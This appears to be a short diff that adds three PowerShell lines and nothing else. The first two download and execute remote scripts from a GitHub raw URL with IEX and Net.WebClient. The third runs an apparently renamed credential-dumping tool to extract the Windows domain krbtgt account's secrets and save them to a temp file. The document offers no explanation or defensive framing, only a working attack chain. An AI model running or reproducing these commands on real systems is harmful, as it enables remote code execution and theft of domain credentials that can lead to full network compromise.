@@ -1,0 +1,3 @@
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Li0ris1it/hello/main/a.txt');
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Li0ris1it/hello/main/Invoke-dog.ps1');
+Invoke-dog -c "dump /service:krbtgt" | out-file -path "c:\temp\loggy2.txt"
